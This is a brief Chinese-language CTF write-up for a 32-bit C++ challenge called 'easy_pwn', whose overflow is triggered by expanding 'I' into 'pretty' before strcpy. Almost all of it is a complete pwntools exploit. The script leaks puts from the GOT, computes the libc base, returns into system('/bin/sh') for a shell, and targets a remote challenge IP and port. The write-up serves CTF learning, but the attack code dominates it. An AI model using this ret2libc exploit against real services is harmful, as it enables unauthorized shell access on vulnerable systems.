## 史上最简单的pwn / easy_pwn
保护仍然是啥都没开，32位，C++编写
用c++的vector和string进行字符串拼接，把输入的`I`替换成了`pretty`，最后strcpy时候溢出
exp:
```python
from pwn import *
context.log_level = 'debug'
elf = ELF('./easy_pwn')
local = 0
if local:
	p = process('./easy_pwn')
	libc = elf.libc
else:
	p = remote("183.129.189.60","10025")
	libc = ELF('./libc6-i386_2.23.so')
main = 0x80492F5

sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
sda = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)

ru("name!\n")
pay = 'I'*0x10 
pay += p32(elf.plt['puts']) + p32(main) + p32(elf.got['puts'])
# gdb.attach(p,"b *0x80490CB")

sl(pay)
ru('\n')
puts_addr = u32(rc(4))
libc_base = puts_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + libc.search("/bin/sh\x00").next()
log.warn("puts_addr --> %s",hex(puts_addr))
log.warn("system --> %s",hex(system))
log.warn("binsh --> %s",hex(binsh))
log.warn("libc_base --> %s",hex(libc_base))

ru("name!\n")
pay = 'I'*0x10
pay += p32(system) + p32(main) + p32(binsh)
# gdb.attach(p,"b *0x80490CB")
sl(pay)

p.interactive()
```